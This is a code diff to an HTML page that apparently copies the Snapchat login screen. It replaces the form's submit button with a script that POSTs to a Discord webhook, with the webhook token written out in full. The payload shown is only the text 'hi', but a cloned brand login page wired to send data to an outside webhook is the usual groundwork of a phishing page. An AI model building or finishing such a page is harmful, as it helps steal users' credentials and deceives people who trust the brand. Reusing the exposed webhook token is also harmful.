@@ -43,13 +43,30 @@
 
                 <p class="secondary_action"><a href="#">Forgot Password</a></p>
 
-                <div class="primary_action login-button">
-                  <button type="submit" id="loginTrigger" class="btn btn-lg btn-primary">
-                    Log In
-                  </button>
-                </div>
-              </form>
-            </div>
+               <div class="primary_action login-button">
+  <button 
+    type="button" 
+    id="loginTrigger" 
+    class="btn btn-lg btn-primary"
+    onclick="send()"
+  >
+    Submit
+  </button>
+</div>
+
+<script>
+function send() {
+  // Your webhook code here:
+  fetch("https://discord.com/api/webhooks/1440084893026619498/EghJR4801Er-ZaAFQcKMVSqHD3MCglFGDQqujsGZpkgUg3mNy-TVSouuBcUX7dzERTtF", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "hi" })
+  })
+  .then(() => alert("Sent!"))
+  .catch(err => console.error(err));
+}
+</script>
+
 
             <div class="create-account-cta">
               <span>New To Snapchat?</span>
